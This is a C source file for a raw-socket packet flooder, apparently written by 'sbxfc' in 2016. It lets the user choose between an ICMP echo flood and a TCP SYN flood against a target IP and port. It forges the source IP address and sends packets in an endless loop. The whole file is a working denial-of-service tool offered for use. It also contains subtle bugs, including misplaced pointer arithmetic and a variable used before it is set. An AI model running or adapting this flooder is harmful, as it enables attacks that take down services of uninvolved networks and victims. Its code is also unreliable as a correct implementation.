/**
 * http://rungame.me 
 * by sbxfc 2016/4/3
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include "icmp_flooder.h"

#define PKT_LEN 11000 /*数据包大小*/
#define DELAY 8 /*ip数据包发送频率ms*/

struct icmp_header
{
	unsigned char type;
	unsigned char code;
	unsigned short checksum;
	unsigned short identifier;
	unsigned short sequence;
};


struct ip_header
{
	unsigned int	hl:4,		/* 4 bit header length */
					ver:4;		/* 4 bit version */
	unsigned char	tos;		/* type of service */
	unsigned short  totl;		/* total length of datagram */
	unsigned short	id;		/* identifier */
	unsigned short 	notused;	/* this is were flags and fragment offset would go */
	unsigned char 	ttl;		/* time to live */
	unsigned char	prot;		/* protocol */
	unsigned short	checksum;		/* our checksum */
	unsigned long 	saddr;		/* source address */
	unsigned long 	daddr;		/* destination address */
};

typedef struct tcp_header
{
	unsigned short source;   //源端口号
	unsigned short dest;     //目的端口号
	unsigned int seq;		 //序列号
	unsigned int ack_seq;    //确认号
	unsigned char offset:4;
	unsigned char doff:4;
	unsigned char fin :1;
	unsigned char syn :1;
	unsigned char rst :1;
	unsigned char psh :1;
	unsigned char ack :1;
	unsigned char urg :1;
	unsigned char ece :1;
	unsigned char cwr :1;
	unsigned short window;     //16位窗口大小
	unsigned short checksum;   //16位TCP检验和
	unsigned short urg_ptr;    //16为紧急指针
};

/* our checksum function */
unsigned short calcsum(unsigned short *buffer, int length);	

void sin_init(short port, char *addr, struct sockaddr_in *sin) {
	 sin->sin_family = AF_INET;
	 sin->sin_port = htons(port);
	 sin->sin_addr.s_addr = inet_addr(addr);
}

int main(int argc, char **argv) {
	int sd, choose, data;
	char buf[PKT_LEN];
	struct ip_header *ip = (struct ip_header *) buf;
	struct tcp_header *tcp = (struct tcp_header *) buf + sizeof(struct ip_header);
	struct icmp_header *icmp = (struct icmp_header *) malloc(sizeof(struct icmp_header));
	char tmp[PKT_LEN];
	struct sockaddr_in sin;
	int root = 1, *ptr = &root;
	
	if (argc < 4) {
		printf("sudo icmp_flooder <ip> <port> <source_ip>\n");
		return -1;
	}
	
	sin_init(atoi(argv[2]), argv[1], &sin);
	memset(buf, 0, PKT_LEN);
	
	ip->hl = 5; 
	ip->ver = 4;
	ip->tos = 16;
	ip->id = htons(50000);
	ip->notused = 0;
	ip->ttl = 64;
	ip->checksum = 0;
	ip->saddr = inet_addr(argv[3]);
	ip->daddr = inet_addr(argv[1]);
    
	printf(".:[ICMP FLOOD]:.\n"
		   "[0] - ICMP ECHO Flood\n"
		   "[1] - TCP SYN Flood\n\n");
	
	printf("::> ");
	scanf("%d", &choose);
	
	if (choose == 0) {
		ip->prot = IPPROTO_ICMP;
		printf("[+] Building the ICMP Packet\n");
		icmp->type = 8;
		icmp->code = 0;
		icmp->checksum = 0;
		icmp->identifier = 1;
		icmp->sequence = 1;
	}

	else if (choose == 1) {	
		ip->prot = IPPROTO_TCP;
		printf("[+] Building the TCP packet with SYN flag on\n");
		tcp->source = htons(9090);
		tcp->dest = htons(atoi(argv[2]));
		tcp->seq = htonl(1);
		tcp->ack_seq = 0;
		tcp->doff = 5;
		tcp->syn = 1;
		tcp->ack = 0;
		tcp->window = htons(5000);
		tcp->checksum = 0;
		tcp->urg_ptr = 0;
	}
	
	else {
		printf("WTF? 1 or 2\n");
		return -1;
	}
	
	sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (choose == 0) {
		ip->totl = sizeof(struct ip_header) + sizeof(struct icmp_header) + data;
		memcpy(tmp, icmp, sizeof(struct icmp_header));
		data = PKT_LEN - sizeof(struct icmp_header) - sizeof(struct ip_header);
		icmp->checksum = calcsum((unsigned short *) tmp, sizeof(struct icmp_header) + data >> 1);
		memcpy(buf+sizeof(struct ip_header), icmp, sizeof(struct icmp_header)+data);
		printf("TOT_LEN: %d\n", sizeof(struct ip_header) + sizeof(struct icmp_header) + data);
		ip->checksum = calcsum((unsigned short *) buf, sizeof(struct ip_header) + sizeof(struct icmp_header) + data >> 1);
	}
	
	if (choose == 1) {
		ip->totl = sizeof(struct tcp_header)+sizeof(struct ip_header);
		ip->checksum = calcsum((unsigned short *) buf, sizeof(struct ip_header) + sizeof(struct tcp_header));
	}
	
	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, ptr, sizeof(root)) < 0) {
		printf("[-] ERROR: Are you sure that you are root?\n");
		return -1;
	}
	printf("[+] Starting flood\n");
	while (1) {
		if (sendto(sd, buf, ip->totl, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
			printf("[-] Error sending the packet \n");
			return -1;
		}
		usleep(DELAY);
	}
	return 0;
}

/* calcsum - used to calculate IP and ICMP header checksums using
 * one's compliment of the one's compliment sum of 16 bit words of the header
 */
unsigned short calcsum(unsigned short *buffer, int length)
{
	unsigned long sum; 	

	// initialize sum to zero and loop until length (in words) is 0 
	for (sum=0; length>1; length-=2) // sizeof() returns number of bytes, we're interested in number of words 
		sum += *buffer++;	// add 1 word of buffer to sum and proceed to the next 

	// we may have an extra byte 
	if (length==1)
		sum += (char)*buffer;

	sum = (sum >> 16) + (sum & 0xFFFF);  // add high 16 to low 16 
	sum += (sum >> 16);		     // add carry 
	return ~sum;
}
